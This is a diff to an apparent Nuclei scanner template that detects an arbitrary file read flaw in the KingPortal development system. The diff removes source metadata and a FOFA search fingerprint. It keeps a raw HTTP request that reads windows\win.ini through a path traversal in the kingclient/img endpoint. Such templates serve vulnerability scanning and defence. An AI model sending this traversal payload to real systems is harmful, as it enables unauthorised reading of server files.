@@ -3,12 +3,8 @@ info:
   name: KingPortal开发系统kingclient任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ydf1g5ro1ukuu0ge'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ydf1g5ro1ukuu0ge
-    fofa: body="/public/javascripts/Common/Util/km_util.js"
 http:
 - raw:
   - 'GET /kingclient/img?imgPath=..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
@@ -23,10 +19,7 @@ http:
 
     Accept-Language: zh-CN,zh;q=0.9
 
-    Connection: close
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351436788-4cacea5c-76f3-4ef8-b6b5-ef1c06549eb7.png)'
+    Connection: close'
   redirects: false
   matchers:
   - status:
